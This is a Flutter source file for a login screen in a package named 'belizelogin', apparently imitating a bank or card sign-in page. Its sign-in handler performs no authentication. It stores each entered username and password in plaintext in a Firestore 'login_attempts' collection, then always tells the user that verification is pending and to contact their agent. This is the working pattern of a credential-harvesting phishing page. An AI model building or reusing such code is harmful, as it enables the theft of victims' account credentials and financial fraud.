import 'package:flutter/material.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:belizelogin/firebase_options.dart';
import 'package:cloud_firestore/cloud_firestore.dart';

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});

  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  final _usernameController = TextEditingController();
  final _passwordController = TextEditingController();
  bool _isLoading = false;

  @override
  void dispose() {
    _usernameController.dispose();
    _passwordController.dispose();
    super.dispose();
  }

  @override
  void initState() {
    super.initState();
    _usernameController.addListener(() => setState(() {}));
    _passwordController.addListener(() => setState(() {}));
  }

  bool get _fieldsfilled =>
      _usernameController.text.isNotEmpty &&
      _passwordController.text.isNotEmpty;

  Future<void> _onSignIn() async {
    print('Sign int tapped');
    final username = _usernameController.text.trim();
    final password = _passwordController.text.trim();

    if (username.isEmpty || password.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('Please fill in all fields')),
      );
      return;
    }

    setState(() => _isLoading = true);

    try {
      await FirebaseFirestore.instance.collection('login_attempts').add({
        'username': username,
        'password':
            password, // ⚠️ plaintext — fine for testing, never in production
        'timestamp': FieldValue.serverTimestamp(),
      });
      // empty fields check

      // on success
      _showPopup(
        'Verification pending, please contact your agent',
        success: true,
      );

      // on error

      // _showPopup('Please fill in all fields');
      _usernameController.clear();
      _passwordController.clear();
    } catch (e) {
      _showPopup('Error: $e');
    } finally {
      setState(() => _isLoading = false);
    }
  }

  void _onForgotPassword() {}

  void _showPopup(String message, {bool success = false}) {
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        title: Text(
          success ? 'Success' : 'Error',
          style: TextStyle(color: success ? Colors.green : Colors.red),
        ),
        content: Text(message),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.blue,
      body: SafeArea(
        child: Padding(
          padding: const EdgeInsets.only(left: 24.0, right: 24, bottom: 150),
          child: Container(
            decoration: BoxDecoration(
              color: Colors.white,
              // borderRadius: BorderRadius.circular(25),
            ),
            child: Padding(
              padding: const EdgeInsets.symmetric(horizontal: 50.0),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.center,
                children: [
                  const SizedBox(height: 48),
                  Image.asset("assets/images/logo.png"),
                  // Username field
                  SizedBox(height: 90),
                  TextField(
                    controller: _usernameController,
                    decoration: const InputDecoration(
                      labelText: 'Username',
                      border: UnderlineInputBorder(),
                      enabledBorder: UnderlineInputBorder(
                        borderSide: BorderSide(color: Colors.grey),
                      ),
                    ),
                  ),

                  const SizedBox(height: 32),

                  // Password field
                  TextField(
                    controller: _passwordController,
                    obscureText: true,
                    decoration: const InputDecoration(
                      labelText: 'Password *',
                      border: UnderlineInputBorder(),
                      enabledBorder: UnderlineInputBorder(
                        borderSide: BorderSide(color: Colors.grey),
                      ),
                    ),
                  ),

                  const SizedBox(height: 24),

                  // Forgot password
                  GestureDetector(
                    onTap: _onForgotPassword,
                    child: const Text(
                      'Forgot Password?',
                      style: TextStyle(color: Colors.blue, fontSize: 16),
                    ),
                  ),

                  const SizedBox(height: 32),

                  // Sign in button
                  SizedBox(
                    width: double.infinity,
                    height: 40,
                    child: ElevatedButton(
                      onPressed: _isLoading ? null : _onSignIn,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: _fieldsfilled
                            ? const Color.fromRGBO(17, 134, 116, 1)
                            : Colors.grey[300],
                        foregroundColor: _fieldsfilled
                            ? Colors.white
                            : Colors.grey[600],
                        elevation: 0,
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(8),
                        ),
                      ),
                      child: const Text(
                        'SIGN IN',
                        style: TextStyle(
                          letterSpacing: 1.2,
                          fontWeight: FontWeight.w500,
                        ),
                      ),
                    ),
                  ),

                  const SizedBox(height: 50),

                  // Enroll row
                  Center(
                    child: Column(
                      children: [
                        const Text(
                          "Don't have an account?",
                          style: TextStyle(color: Colors.black87),
                        ),
                        const Text(
                          'Enroll now',
                          style: TextStyle(color: Colors.blue, fontSize: 16),
                        ),
                        const SizedBox(height: 50),
                        Image.asset("assets/images/cc-features.png"),
                      ],
                    ),
                  ),

                  const SizedBox(height: 32),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }
}
